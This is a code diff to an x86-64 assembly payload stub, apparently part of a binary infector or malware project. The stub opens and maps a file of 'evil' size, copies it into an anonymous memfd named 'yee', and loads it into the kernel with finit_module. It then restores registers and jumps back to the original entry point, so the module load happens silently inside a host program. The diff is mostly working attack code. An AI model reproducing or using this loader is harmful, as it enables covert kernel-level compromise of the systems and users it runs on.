@@ -24,6 +24,7 @@ entry:
     push r9
 
 payload:
+# open(file, 0, 0)
     mov rax, 2
     lea rdi, [rip + file]
     mov rsi, 0
@@ -32,6 +33,7 @@ payload:
     cmp rax, 0
     jl return
 
+# mmap(0, evil_size, 1, 2, fd, evil_base)
     mov r8, rax
     mov rax, 9
     mov rdi, 0
@@ -43,10 +45,30 @@ payload:
     cmp rax, -1
     je return
 
+# push address onto stack
+    push rax
+
+# memfd_create("yee", 1)
+    mov rax, 319
+    lea rdi, [rip + yee]
+    mov rsi, 1
+    syscall
+    cmp rax, 0
+    jl return
+
+# write(fd, address, evil_size)
+    pop rsi
+    push rax
     mov rdi, rax
-    mov rax, 0xaf
-    mov rsi, [rip + evil_size]
-    lea rdx, [rip + zero]
+    mov rax, 1
+    mov rdx, [rip + evil_size]
+    syscall
+
+# finit_module(fd, "", 0)
+    pop rdi
+    mov rax, 313
+    lea rsi, [rip + zero]
+    mov rdx, 0
     syscall
 
 return:
@@ -61,5 +83,6 @@ return:
     pop rdi
     jmp rcx
 
-
+yee:
+    .asciz "yee"
 file:
